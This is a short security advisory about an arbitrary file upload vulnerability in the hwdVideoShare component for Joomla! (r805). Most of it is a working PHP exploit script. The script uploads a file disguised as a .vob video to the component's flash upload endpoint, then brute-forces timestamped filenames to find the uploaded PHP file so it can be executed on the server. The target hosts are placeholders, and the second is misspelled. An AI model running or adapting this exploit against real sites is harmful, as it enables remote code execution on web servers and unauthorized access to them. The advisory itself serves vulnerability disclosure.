source: http://www.securityfocus.com/bid/54037/info

The hwdVideoShare component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

hwdVideoShare r805 is vulnerable; other versions may also be affected. 


<?php

$uploadfile="lo.php.vob";

$ch = 
curl_init("http://www.example.com/components/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
                array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);

print "$postResult";
echo "<br />";

     $i = 0;
     for ($i=1;$i<9999;$i++)
     {
         $n = 4;
         $num = str_pad((int) $i,$n,"0",STR_PAD_LEFT);
         $filename = date('YmdH').$num.$uploadfile;
         $url = "http://www.exemple.com/tmp/".$filename;
         $c = curl_init("$url");
         $postResult2 = curl_exec($c);
         $info = curl_getinfo($c);
             $httpcode = $info['http_code'];
                 if($httpcode == 200){
                     echo $url;
                     curl_close($c);
                     exit;
                 }
     }
?>